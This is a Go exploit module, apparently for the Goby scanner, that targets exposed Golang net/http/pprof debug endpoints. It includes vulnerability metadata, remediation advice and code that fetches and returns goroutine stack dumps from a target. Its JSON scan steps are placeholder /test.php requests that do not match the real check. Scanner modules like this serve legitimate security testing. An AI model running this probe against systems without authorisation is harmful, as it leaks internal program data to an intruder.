package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Golang pprof information leakage vulnerability",
    "Description": "<p>pprof is a performance analysis tool in the Go language. It is one of the standard libraries of Go and is used to generate performance analysis data of the program.</p><p>If the Go language's net/http/ppro package is not configured correctly and exposed to the public network, it can easily cause sensitive information leakage, leading to the leakage of source code and other information.</p>",
    "Product": "GoLang",
    "Homepage": "https://go.dev/",
    "DisclosureDate": "2024-02-01",
    "PostTime": "2024-02-01",
    "Author": "woo0nise@gmail.com",
    "FofaQuery": "body=\"/debug/pprof/\" || protocol=\"http\" || protocol=\"https\"",
    "GobyQuery": "body=\"/debug/pprof/\" || protocol=\"http\" || protocol=\"https\"",
    "Level": "1",
    "Impact": "<p>If the Go language's net/http/ppro package is not configured correctly and exposed to the public network, it can easily cause sensitive information leakage, leading to the leakage of source code and other information.</p>",
    "Recommendation": "<p>1. Restrict access permissions: Configure the endpoint of net/http/pprof to be accessible only on trusted internal networks, not the public network.</p><p>2. Use authentication and authorization: When accessing performance analysis endpoints, implement basic authentication and authorization mechanisms to ensure that only authorized users have access.</p><p>3. Avoid using it in a production environment: In a production environment, you can choose not to use net/http/pprof, or enable it only when needed instead of keeping it on all the time.</p><p>4. Use a secure proxy: If you really need to use net/http/pprof in a production environment, consider using a reverse proxy to hide it in a secure network environment and only allow access to trusted hosts.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "Golang pprof 信息泄漏漏洞",
            "Product": "GoLang",
            "Description": "<p>pprof 是 Go 语言中的性能分析工具，它是 Go 的标准库之一，用于生成程序的性能剖析数据。<br></p><p>Go语言的 net/http/ppro 包如未配置正确暴露在公网容易引起敏感信息泄漏问题，导致源码等信息泄漏。<br></p>",
            "Recommendation": "<p>1、限制访问权限： 将 net/http/pprof 的端点配置为仅在受信任的内部网络上可访问，而不是公网。</p><p>2、使用认证和授权： 在访问性能分析端点时，实施基本的认证和授权机制，以确保只有授权用户能够访问。</p><p>3、避免在生产环境中使用： 在生产环境中，可以选择不使用 net/http/pprof，或者仅在需要时启用，而不是一直保持开启状态。</p><p>4、使用安全的代理： 如果你确实需要在生产环境中使用 net/http/pprof，可以考虑使用反向代理，将其隐藏在安全的网络环境中，只允许受信任的主机访问。</p>",
            "Impact": "<p>Go语言的 net/http/ppro 包如未配置正确暴露在公网容易引起敏感信息泄漏问题，导致源码等信息泄漏。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Golang pprof information leakage vulnerability",
            "Product": "GoLang",
            "Description": "<p>pprof is a performance analysis tool in the Go language. It is one of the standard libraries of Go and is used to generate performance analysis data of the program.</p><p>If the Go language's net/http/ppro package is not configured correctly and exposed to the public network, it can easily cause sensitive information leakage, leading to the leakage of source code and other information.</p>",
            "Recommendation": "<p>1. Restrict access permissions: Configure the endpoint of net/http/pprof to be accessible only on trusted internal networks, not the public network.</p><p>2. Use authentication and authorization: When accessing performance analysis endpoints, implement basic authentication and authorization mechanisms to ensure that only authorized users have access.</p><p>3. Avoid using it in a production environment: In a production environment, you can choose not to use net/http/pprof, or enable it only when needed instead of keeping it on all the time.</p><p>4. Use a secure proxy: If you really need to use net/http/pprof in a production environment, consider using a reverse proxy to hide it in a secure network environment and only allow access to trusted hosts.</p>",
            "Impact": "<p>If the Go language's net/http/ppro package is not configured correctly and exposed to the public network, it can easily cause sensitive information leakage, leading to the leakage of source code and other information.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10918"
}`
	checkFileFlagFTuDt2 := func(hostInfo *httpclient.FixUrl) (*httpclient.HttpResponse, error) {
		uris := []string{`/debug/pprof/goroutine?debug=1`, `/debug/pprof/`}
		for _, uri := range uris {
			checkRequestConfig := httpclient.NewGetRequestConfig(uri)
			checkRequestConfig.VerifyTls = false
			checkRequestConfig.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(hostInfo, checkRequestConfig); resp != nil && resp.StatusCode == 200 && (strings.Contains(resp.RawBody, `goroutine profile: total`) ||
				(strings.Contains(resp.RawBody, `full goroutine stack dump`) && strings.Contains(resp.RawBody, `goroutine?debug=`)) ||
				(strings.Contains(resp.RawBody, `Types of profiles available`) && strings.Contains(resp.RawBody, `Profile Descriptions`))) {
				return resp, nil
			} else if err != nil {
				return nil, err
			}
		}
		return nil, errors.New("漏洞利用失败")
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			resp, err := checkFileFlagFTuDt2(hostInfo)
			success := resp != nil && err == nil
			if success {
				ss.VulURL = hostInfo.FixedHostInfo + resp.Request.URL.Path
				if len(resp.Request.URL.RawQuery) > 0 {
					ss.VulURL += `?` + resp.Request.URL.RawQuery
				}
			}
			return success
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if resp, err := checkFileFlagFTuDt2(expResult.HostInfo); resp != nil && err == nil {
				expResult.Output = resp.RawBody
				expResult.Success = true
			} else if err != nil {
				expResult.Output = err.Error()
			} else {
				expResult.Output = `漏洞利用失败`
			}
			return expResult
		},
	))
}
